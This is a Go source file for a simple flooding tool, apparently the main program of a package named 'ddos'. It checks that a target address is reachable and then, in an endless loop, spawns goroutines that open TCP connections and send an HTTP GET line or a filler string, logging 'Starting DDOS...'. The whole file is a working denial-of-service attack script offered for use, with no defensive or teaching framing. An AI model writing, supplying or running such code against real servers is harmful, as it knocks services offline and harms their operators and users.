package main

import (
	"ddos/options"
	"fmt"
	"log"
	"net"
	"time"
)

const (
	HttpMessage   = "GET / HTTP/1.0\n"
	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
)

func checkServer(opt options.Options) {
	conn, err := net.Dial("tcp", opt.Address)
	if err != nil {
		log.Fatal(err)
	}
	message := ""
	if opt.Http {
		message = HttpMessage
	} else {
		message = SocketMessage
	}
	_, err = fmt.Fprint(conn, message)
	if err != nil {
		panic(err)
	}
	err = conn.Close()
	if err != nil {
		panic(err)
	}
}

func ddos(opt options.Options) {
	conn, err := net.Dial("tcp", opt.Address)
	if err != nil {
		log.Printf("Couldn't connect to server (%v)...", err)
		return
	}
	message := ""
	if opt.Http {
		message = HttpMessage
	} else {
		message = SocketMessage
	}
	fmt.Fprint(conn, message)
	conn.Close()
}

func main() {
	log.SetFlags(3)

	opt := options.Parse()

	checkServer(opt)

	log.Printf("Starting DDOS...")

	for {
		go ddos(opt)
		time.Sleep(time.Millisecond * time.Duration(opt.Delay))
	}
}
